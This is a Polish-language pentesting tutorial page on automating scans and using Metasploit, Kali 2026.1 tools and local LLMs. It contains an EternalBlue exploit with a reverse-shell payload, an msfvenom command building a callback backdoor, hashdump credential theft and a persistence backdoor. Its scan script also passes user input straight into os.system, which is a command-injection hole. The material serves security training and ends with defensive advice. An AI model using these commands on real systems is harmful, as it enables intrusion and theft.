---
id: "automatyzacja-eksploatacja"
title: "🤖 Automatyzacja i eksploatacja"
sidebar_position: 13
---

# 🤖 Automatyzacja i eksploatacja

Automatyzacja testów penetracyjnych pozwala zwiększyć efektywność pracy pentestera, eliminując powtarzalne zadania i przyspieszając proces wykrywania podatności. W tej sekcji omówimy, jak pisać własne skrypty do pentestów oraz jak skutecznie korzystać z **Metasploit Framework**.

---

## ⚙️ Automatyzacja testów penetracyjnych

### **1️⃣ Jak pisać własne skrypty do pentestów?**
Automatyzacja testów może obejmować:
- **Skanowanie sieci**
- **Automatyczne wykrywanie podatności**
- **Eksploatację znanych luk**
- **Analizę logów i danych zebranych podczas testów**

#### **1.1 Tworzenie skryptu w Pythonie do automatycznego skanowania Nmap**
```python
import os

target = input("Podaj adres IP lub domenę: ")
os.system(f"nmap -A -p- {target}")
```
Zapisz plik jako `scan.py` i uruchom:
```bash
python3 scan.py
```

#### **1.2 Automatyczne wyszukiwanie ukrytych katalogów w Bash**
```bash
#!/bin/bash
TARGET=$1
WORDLIST=/usr/share/wordlists/dirb/common.txt
echo "Skanowanie: $TARGET"
gobuster dir -u $TARGET -w $WORDLIST -x php,html,txt
```
Zapisz plik jako `dirscan.sh`, nadaj uprawnienia i uruchom:
```bash
chmod +x dirscan.sh
./dirscan.sh http://example.com
```

#### **1.3 Automatyczna analiza logów HTTP**
```python
with open("access.log", "r") as file:
    for line in file:
        if "admin" in line or "login" in line:
            print(line)
```

---

## 🔥 Metasploit – podstawy i zaawansowane funkcje

Metasploit to jedno z najpotężniejszych narzędzi do eksploitacji systemów.

### **2️⃣ Podstawowe komendy w Metasploit**

#### **2.1 Uruchamianie Metasploit**
```bash
msfconsole
```

#### **2.2 Wyszukiwanie exploitów**
```bash
search smb
```

#### **2.3 Wybieranie exploita**
```bash
use exploit/windows/smb/ms17_010_eternalblue
```

#### **2.4 Konfiguracja exploita**
```bash
set RHOSTS 192.168.1.10
set LHOST 192.168.1.100
set PAYLOAD windows/meterpreter/reverse_tcp
```

#### **2.5 Uruchomienie ataku**
```bash
exploit
```

---

### **3️⃣ Zaawansowane techniki w Metasploit**

#### **3.1 Automatyczne wykrywanie podatności (db_nmap)**
```bash
db_nmap -A -p- 192.168.1.0/24
```

#### **3.2 Tworzenie backdoora w Metasploit**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe > backdoor.exe
```

#### **3.3 Post-Exploitation: Pobranie haseł**
Po uzyskaniu dostępu do systemu można spróbować przechwycić hasła:
```bash
meterpreter > hashdump
```

#### **3.4 Tworzenie persistent backdoor**
```bash
run persistence -X -i 10 -p 4444 -r 192.168.1.100
```
Dzięki temu po restarcie maszyny backdoor nadal będzie aktywny.

---

## 🆕 Nowe narzędzia automatyzacji w Kali 2026.1

### **4️⃣ AdaptixC2 – Framework Command & Control**

AdaptixC2 to nowoczesny framework C2 dedykowany emulacji grup APT, dostępny w Kali 2026.1:

```bash
# Uruchomienie serwera AdaptixC2
adaptixc2 server --config /etc/adaptixc2/config.yaml

# Podgląd aktywnych agentów
adaptixc2 client --connect 127.0.0.1:8080
```

Zastosowania: symulacja kampanii APT, testowanie mechanizmów detekcji EDR/SIEM.

---

### **5️⃣ Atomic-Operator – Testy zgodne z MITRE ATT&CK**

Atomic-Operator automatyzuje testy jednostkowe oparte na bazie **MITRE ATT\&CK**, co pozwala weryfikować czy systemy detekcji (SIEM, EDR) prawidłowo reagują na znane techniki ataku:

```bash
# Instalacja
pip3 install atomic-operator

# Uruchomienie konkretnej techniki ATT&CK
atomic-operator run --atomics-path /opt/atomic-red-team/atomics \
  --technique T1059.004

# Lista dostępnych technik
atomic-operator list
```

Przykładowe techniki:
- `T1059.004` – Command and Scripting: Unix Shell
- `T1003.001` – OS Credential Dumping: LSASS Memory
- `T1566.001` – Phishing: Spearphishing Attachment

---

## 🤖 AI i LLM w testach penetracyjnych

Kali 2026.1 oficjalnie wchodzi w erę **Private AI** — modele językowe działają lokalnie, bez wysyłania wrażliwych danych klienta do zewnętrznych serwisów.

### **6️⃣ Lokalne LLM z Ollama**

```bash
# Instalacja Ollama
curl -fsSL https://ollama.com/install.sh | sh

# Pobranie modelu (np. llama3 lub mistral)
ollama pull llama3

# Generowanie komend pentesterskich
ollama run llama3 "Wygeneruj komendę nmap do wykrycia otwartych portów i wersji usług na 192.168.1.0/24"
```

### **6.1 Przykłady zastosowań AI w pentestach**

```bash
# Analiza kodu pod kątem podatności
cat webapp.py | ollama run codellama "Znajdź podatności bezpieczeństwa w tym kodzie"

# Generowanie payloadów SQLi dla konkretnego kontekstu
ollama run mistral "Wygeneruj payloady SQL Injection dla MySQL, kontekst: pole 'username' w formularzu logowania"

# Pomoc w analizie odpowiedzi HTTP
curl -s https://target.example.com | ollama run llama3 "Przeanalizuj te nagłówki HTTP pod kątem problemów bezpieczeństwa"
```

### **6.2 5ire – Platforma AI dla pentesterów**

5ire to interfejs do lokalnych modeli AI zintegrowany z Kali:

```bash
# Uruchomienie 5ire
5ire --model ollama/llama3 --context pentest
```

> ⚠️ **Ważne:** Nawet przy lokalnych modelach — nigdy nie wklejaj do LLM prawdziwych danych uwierzytelniających, haseł ani danych osobowych klientów.

---

## 🔐 Jak zabezpieczyć się przed automatycznymi atakami AI?
✅ **Monitorowanie ruchu sieciowego i nietypowych skanowań**
✅ **Blokowanie narzędzi typu Metasploit w systemach produkcyjnych**
✅ **Regularne aktualizacje systemów i patchowanie znanych podatności**
✅ **Wykrywanie i blokowanie backdoorów za pomocą EDR (Endpoint Detection & Response)**
✅ **Wdrożenie systemów detekcji behawioralnej zdolnych do wykrywania technik ATT&CK (MITRE D3FEND)**
✅ **Monitorowanie nietypowych wzorców poleceń wskazujących na automatyzację AI**

---

Automatyzacja i Metasploit to kluczowe narzędzia w arsenale pentestera. Kolejnym krokiem będzie **Reverse Shell i Post-Exploitation**! 🚀
